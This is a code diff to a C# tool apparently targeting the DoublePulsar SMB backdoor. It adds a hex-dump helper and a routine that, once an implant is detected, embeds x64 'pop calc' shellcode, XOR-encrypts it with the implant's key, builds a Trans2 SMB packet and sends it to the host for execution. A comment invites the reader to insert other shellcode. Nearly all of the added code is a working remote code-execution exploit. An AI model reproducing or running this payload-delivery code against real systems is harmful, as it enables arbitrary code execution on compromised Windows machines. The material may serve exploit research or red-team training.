@@ -495,6 +495,80 @@ namespace DoublePulsar
             Marshal.FreeHGlobal(ptr);
             return str;
         }
+        
+        public static string HexDump(byte[] bytes, int bytesPerLine = 16)
+        {
+            if (bytes == null) return "<null>";
+            int bytesLength = bytes.Length;
+
+            char[] HexChars = "0123456789ABCDEF".ToCharArray();
+
+            int firstHexColumn =
+                  8                   // 8 characters for the address
+                + 3;                  // 3 spaces
+
+            int firstCharColumn = firstHexColumn
+                + bytesPerLine * 3       // - 2 digit for the hexadecimal value and 1 space
+                + (bytesPerLine - 1) / 8 // - 1 extra space every 8 characters from the 9th
+                + 2;                  // 2 spaces 
+
+            int lineLength = firstCharColumn
+                + bytesPerLine           // - characters to show the ascii value
+                + Environment.NewLine.Length; // Carriage return and line feed (should normally be 2)
+
+            char[] line = (new String(' ', lineLength - 2) + Environment.NewLine).ToCharArray();
+            int expectedLines = (bytesLength + bytesPerLine - 1) / bytesPerLine;
+            StringBuilder result = new StringBuilder(expectedLines * lineLength);
+
+            for (int i = 0; i < bytesLength; i += bytesPerLine)
+            {
+                line[0] = HexChars[(i >> 28) & 0xF];
+                line[1] = HexChars[(i >> 24) & 0xF];
+                line[2] = HexChars[(i >> 20) & 0xF];
+                line[3] = HexChars[(i >> 16) & 0xF];
+                line[4] = HexChars[(i >> 12) & 0xF];
+                line[5] = HexChars[(i >> 8) & 0xF];
+                line[6] = HexChars[(i >> 4) & 0xF];
+                line[7] = HexChars[(i >> 0) & 0xF];
+
+                int hexColumn = firstHexColumn;
+                int charColumn = firstCharColumn;
+
+                for (int j = 0; j < bytesPerLine; j++)
+                {
+                    if (j > 0 && (j & 7) == 0) hexColumn++;
+                    if (i + j >= bytesLength)
+                    {
+                        line[hexColumn] = ' ';
+                        line[hexColumn + 1] = ' ';
+                        line[charColumn] = ' ';
+                    }
+                    else
+                    {
+                        byte b = bytes[i + j];
+                        line[hexColumn] = HexChars[(b >> 4) & 0xF];
+                        line[hexColumn + 1] = HexChars[b & 0xF];
+                        line[charColumn] = asciiSymbol(b);
+                    }
+                    hexColumn += 3;
+                    charColumn++;
+                }
+                result.Append(line);
+            }
+            return result.ToString();
+        }
+
+        static char asciiSymbol(byte val)
+        {
+            if (val < 32) return '.';  // Non-printable ASCII
+            if (val < 127) return (char)val;   // Normal ASCII
+                                               // Handle the hole in Latin-1
+            if (val == 127) return '.';
+            if (val < 0x90) return "€.‚ƒ„…†‡ˆ‰Š‹Œ.Ž."[val & 0xF];
+            if (val < 0xA0) return ".‘’“”•–—˜™š›œ.žŸ"[val & 0xF];
+            if (val == 0xAD) return '.';   // Soft hyphen: this symbol is zero-width even in monospace fonts
+            return (char)val;   // Normal Latin-1
+        }
 
         static public byte[] ClientNegotiate(Socket sock)
         {
@@ -718,16 +792,189 @@ namespace DoublePulsar
                 string arch = calculate_doublepulsar_arch(signature_long);
 
                 Console.WriteLine("DOUBLEPULSAR SMB IMPLANT DETECTED!!! Arch: {arch}, XOR Key: {key,4:X}");
+                
+                //insert your shellcode here
+                byte[] pop_calc_shellcode_buffer = new byte[]
+                    {
+                        0x48,0x31,0xff,0x48,0xf7,0xe7,0x65,0x48,0x8b,0x58,0x60,0x48,0x8b,0x5b,0x18,0x48,0x8b,0x5b,0x20,0x48,0x8b,0x1b,0x48,0x8b,0x1b,0x48,0x8b,0x5b,0x20,0x49,0x89,0xd8,0x8b,
+                        0x5b,0x3c,0x4c,0x01,0xc3,0x48,0x31,0xc9,0x66,0x81,0xc1,0xff,0x88,0x48,0xc1,0xe9,0x08,0x8b,0x14,0x0b,0x4c,0x01,0xc2,0x4d,0x31,0xd2,0x44,0x8b,0x52,0x1c,0x4d,0x01,0xc2,
+                        0x4d,0x31,0xdb,0x44,0x8b,0x5a,0x20,0x4d,0x01,0xc3,0x4d,0x31,0xe4,0x44,0x8b,0x62,0x24,0x4d,0x01,0xc4,0xeb,0x32,0x5b,0x59,0x48,0x31,0xc0,0x48,0x89,0xe2,0x51,0x48,0x8b,
+                        0x0c,0x24,0x48,0x31,0xff,0x41,0x8b,0x3c,0x83,0x4c,0x01,0xc7,0x48,0x89,0xd6,0xf3,0xa6,0x74,0x05,0x48,0xff,0xc0,0xeb,0xe6,0x59,0x66,0x41,0x8b,0x04,0x44,0x41,0x8b,0x04,
+                        0x82,0x4c,0x01,0xc0,0x53,0xc3,0x48,0x31,0xc9,0x80,0xc1,0x07,0x48,0xb8,0x0f,0xa8,0x96,0x91,0xba,0x87,0x9a,0x9c,0x48,0xf7,0xd0,0x48,0xc1,0xe8,0x08,0x50,0x51,0xe8,0xb0,
+                        0xff,0xff,0xff,0x49,0x89,0xc6,0x48,0x31,0xc9,0x48,0xf7,0xe1,0x50,0x48,0xb8,0x9c,0x9e,0x93,0x9c,0xd1,0x9a,0x87,0x9a,0x48,0xf7,0xd0,0x50,0x48,0x89,0xe1,0x48,0xff,0xc2,
+                        0x48,0x83,0xec,0x20,0x41,0xff,0xd6
+                    };
+                
+                    byte[] ByteXORKEY = INT2LE(key);
 
+                    byte[] shellcode = MakeKernelUserPayload(pop_calc_shellcode_buffer);
+                    int shellcode_len = shellcode.Length;
+
+                    byte[] SC = new byte[shellcode_len];
+                    Array.Clear(SC, 0, shellcode_len);
+                    Array.Copy(shellcode, SC, shellcode.Length);
+                    System.Console.WriteLine("Shellcode buffer...\n");
+                    System.Console.WriteLine(HexDump(SC));
+
+                    _l.Info($"[+] [{ip}] DOUBLEPULSAR - Encrypting shellcode buffer");
+                    System.Console.WriteLine("Encrypting shellcode buffer...\n");
+                    for (Int32 i = 0; i < SC.Length; i++)
+                    {
+                        SC[i] ^= (byte)ByteXORKEY[i % 4];
+                    }
+
+                    System.Console.WriteLine(HexDump(SC));
+
+                    List<byte> Parameters = new List<byte>();
+                    Parameters.AddRange(Enumerable.Repeat((byte)0x00, 12));
+
+                    //convert params to byte
+                    //byte[] paramBytes = GetBytes(Parameters);
+                    byte[] paramz = Parameters.ToArray();
+                    UInt32 TotalByteCount = (uint)SC.Length;
+                    UInt32 ChunkSize = (uint)SC.Length;
+                    UInt32 Offset = 0;
+
+                    byte[] ByteTotalByteCount = INT2LE(TotalByteCount);
+                    byte[] ByteChunkSize = INT2LE(ChunkSize);
+                    byte[] ByteOffset = INT2LE(Offset);
+
+                    System.Buffer.BlockCopy(ByteTotalByteCount, 0, paramz, 0, 4);
+                    System.Buffer.BlockCopy(ByteChunkSize, 0, paramz, 4, 4);
+                    System.Buffer.BlockCopy(ByteOffset, 0, paramz, 8, 4);
+
+                    System.Console.WriteLine("Parameters before encryption...\n");
+                    System.Console.WriteLine(HexDump(paramz));
+
+                    System.Console.WriteLine("Encrypting parameters...\n");
+                    for (Int32 i = 0; i < paramz.Length; i++)
+                    {
+                        paramz[i] ^= (byte)ByteXORKEY[i % 4];
+                    }
+                    System.Console.WriteLine("Parameters after XOR Encryption...\n");
+                    System.Console.WriteLine(HexDump(paramz));
+                    System.Console.WriteLine("[+] [{ip}] DOUBLEPULSAR - Generating parameters...");
+                    System.Console.WriteLine("[+] [{ip}] { HexDump(paramz) }");
+
+                    SMB_COM_TRANSACTION2_SECONDARY_REQUEST transaction2SecondaryRequest = new SMB_COM_TRANSACTION2_SECONDARY_REQUEST
+                    {
+                        WordCount = 15,
+                        TotalParameterCount = 12,
+                        TotalDataCount = 0x1000,
+                        MaxParameterCount = 1,
+                        MaxDataCount = 0x0000,
+                        MaxSetupCount = 0x00,
+                        Reserved = 0x00,
+                        Flags = 0x00,
+                        Timeout = 0x001a8925, // [25,89,1a0,00] in packet.  0x001a8925
+                        Reserved2 = 0x00,
+                        ParameterCount = 12,
+
+                        //where in the packet is the location of the parameters
+                        //(NETBIOS) + (SMB) + (transaction2SecondaryRequest) -> < PARAMETERS ARE HERE >
+                        ParameterOffset = 0x0042, //0x0035 OR ParameterDisplacement (NETBIOS) + (SMB) + (transaction2SecondaryRequest) -> (parameters=12)
+                        DataCount = 0, //will be updated with the values below
+
+                        //where in the packet is the location of the SMBDATA
+                        //(NETBIOS) + (SMB) + (transaction2SecondaryRequest) + (PARAMETERS) -> < SMBDATA IS HERE>
+                        DataOffset = 0x004e, // DataDisplacement (NETBIOS) + (SMB) + (transaction2SecondaryRequest) (parameters=12) -> ( SMBData=4096 MAX)
+                        setupcount = 1, //0x01;
+                        reserved3 = 0x00,
+                        subcommand = 0x000E,
+                        ByteCount = 0,
+                        padding = 0x00
+                    };
+
+                    EternalBlue.SMB_HEADER header = new EternalBlue.SMB_HEADER
+                    {
+                        protocol = 0x424d53ff,
+                        command = 0x32,
+                        errorClass = 0x00,
+                        _reserved = 0x00,
+                        errorCode = 0x0000,
+                        flags = 0x18,
+                        flags2 = 0xc007,
+                        PIDHigh = 0x0000,
+                        SecurityFeatures = 0x0000000000000000,
+                        reserved = 0x0000,
+                        TID = 0xfeff,     //need this value from previous exchanges
+                        PIDLow = 0xfeff,  //PIDLow = 0x4b2f,
+                        UID = 0x0008,     //need this value from previous exchanges
+                        MID = 0x0042
+                    };
+
+                    //Merge SMBHeader with the transaction2SecondaryRequest
+                    byte[] headerBytes = EternalBlue.GetBytes(header);
+
+                    transaction2SecondaryRequest.TotalDataCount = (ushort)SC.Length; // Marshal.SizeOf(encrypted_payload);
+                    transaction2SecondaryRequest.DataCount = (ushort)SC.Length; // Marshal.SizeOf(encrypted_payload);
+
+                    ushort byteCountOfEncryptedPayload = (ushort)(SC.Length + 13); // Marshal.SizeOf(encrypted_payload) + 13;
+                    transaction2SecondaryRequest.ByteCount = (ushort)byteCountOfEncryptedPayload;
+
+                    byte[] transaction2SecondaryRequestbytes = EternalBlue.GetBytes(transaction2SecondaryRequest).ToArray();
+                    byte[] pkt = headerBytes.Concat(transaction2SecondaryRequestbytes).ToArray();
+
+                    System.Console.WriteLine(HexDump(pkt));
+
+                    System.Console.WriteLine("Adding parameters to the end");
+                    //append the parameteters to the end of pkt
+                    pkt = pkt.Concat(paramz.ToArray()).ToArray(); //Collect it all
+
+                    System.Console.WriteLine(HexDump(pkt));
+
+                    System.Console.WriteLine("Adding SMB Data to the end");
+                    //append SMBData to the end of pkt
+                    pkt = pkt.Concat(SC.ToArray()).ToArray(); //Collect it all
+
+                    System.Console.WriteLine(HexDump(pkt));
+
+                    System.Console.WriteLine("SMB packet does not have a size header.  Adding the header!");
+                    uint size = (uint)pkt.Length;
+                    byte[] intBytes = BitConverter.GetBytes(size).Reverse().ToArray();
+                    EternalBlue.NETBIOS_HEADER netbios_header = new EternalBlue.NETBIOS_HEADER();
+                    netbios_header.MessageTypeAndSize = BitConverter.ToUInt32(intBytes, 0);
+                    byte[] netbios_header_packet = EternalBlue.GetBytes(netbios_header);
+                    byte[] fullMessage = netbios_header_packet.Concat(pkt).ToArray();
+                    System.Console.WriteLine(HexDump(fullMessage));
+
+                    //patch user ID and tree ID here with UserID & TreeID bytes
+                    fullMessage[28] = tree_id[0];
+                    fullMessage[29] = tree_id[1];
+                    fullMessage[32] = user_id[0];
+                    fullMessage[33] = user_id[1];
+
+                    try
+                    {
+                        s.Send(fullMessage);
+                        //SendSMBMessage(sock, pkt, true);
+                        //return ReceiveSMBMessage(sock);
+
+                        s.Receive(buf, 1024, SocketFlags.None);
+                        final_response = buf;
+                        // Check for 0x51 response to indicate DOUBLEPULSAR infection
+                        if (final_response[34] == 0x52)
+                        {
+                            System.Console.WriteLine("[{ip}] DOUBLEPULSAR - Returned {final_response[34]}.  SUCCESS!");
+                        }
+
+
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine("Socket Error, during sending: " + e.Message);
+                    }
+                
+                
                 //XorEncrypt the payload
                 //XorEncrypt(shellcode, (UInt32)key);
-                byte[] payload_shellcode = XorDecryptFunc(shellcode, (int)key);
+                //byte[] payload_shellcode = XorDecryptFunc(shellcode, (int)key);
 
                 //Build DoublePulsar payload packet
                 // byte[] doublepulsar_parameters = new byte[12];
-                int size = Marshal.SizeOf(shellcode);
-                int chunk_size = Marshal.SizeOf(shellcode);
-                int offset = 0x00000000;
+                //int size = Marshal.SizeOf(shellcode);
+                //int chunk_size = Marshal.SizeOf(shellcode);
+                //int offset = 0x00000000; 
                 //copy them to doublepulsar_parameters
                 /*
                 https://docs.microsoft.com/en-us/dotnet/api/system.buffer.memorycopy?view=net-5.0
@@ -758,6 +1005,7 @@ namespace DoublePulsar
                 //XorEncrypt the parameters
                 //XorEncrypt(doublepulsar_parameters, (UInt32)key);
 
+                /*
                 List<byte> doublepulsar_parameters = new List<byte>();
                 doublepulsar_parameters.Add((byte)size);
                 doublepulsar_parameters.Add((byte)chunk_size);
@@ -767,16 +1015,16 @@ namespace DoublePulsar
                 byte[] xor_doublepulsar_parameters = XorDecryptFunc(byte_doublepulsar_parameters, (int)key);
 
                 byte[] doublepulsar_exploit_pkt = MakeTrans2Packet(sock, header.TID, header.UID, xor_doublepulsar_parameters, payload_shellcode);
-                //header = new SMB_HEADER();
+                header = new SMB_HEADER();
                 header = SMB_HeaderFromBytes(doublepulsar_exploit_pkt);
-                if (header.MID == 82) /* 0x52 in hex */
+                if (header.MID == 82) 
                 {
                     Console.WriteLine("It appears that DoublePulsar processed the command successfully!\n");
                 }
                 else
                 {
                     Console.WriteLine("an error occured and it does not appear that DoublePulsar ran successfully\n");
-                }
+                } */
 
                 /*
               try
